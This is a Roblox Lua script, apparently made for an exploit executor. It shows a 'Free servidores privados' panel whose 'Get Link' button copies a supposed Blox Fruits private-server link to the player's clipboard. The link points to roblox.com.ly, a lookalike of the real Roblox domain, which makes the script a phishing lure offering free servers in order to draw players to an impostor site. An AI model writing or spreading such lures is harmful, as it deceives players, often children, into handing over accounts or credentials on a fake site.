local Players = game:GetService("Players")
local player = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FSC_Loader"
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 320, 0, 180)
Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
Frame.Parent = ScreenGui
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0.4,0)
Title.BackgroundTransparency = 1
Title.Text = "Free servidores privados\nCreado por Free Servers Community"
Title.TextColor3 = Color3.new(1,1,1)
Title.TextScaled = true
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0.8,0,0.3,0)
Button.Position = UDim2.new(0.1,0,0.6,0)
Button.BackgroundColor3 = Color3.fromRGB(0,170,255)
Button.TextColor3 = Color3.new(1,1,1)
Button.TextScaled = true
Button.Text = "Get Link"
Button.Parent = Frame

local link = "https://roblox.com.ly/games/2753915549/Event-Blox-Fruits?privateServerLinkCode=36614867226193845417684496298532"

Button.MouseButton1Click:Connect(function()
	Button.Text = "Copiando..."
	
	task.wait(3)
	
	if setclipboard then
		setclipboard(link)
		Button.Text = "¡Copiado!"
	else
		Button.Text = "No soportado"
	end
end)
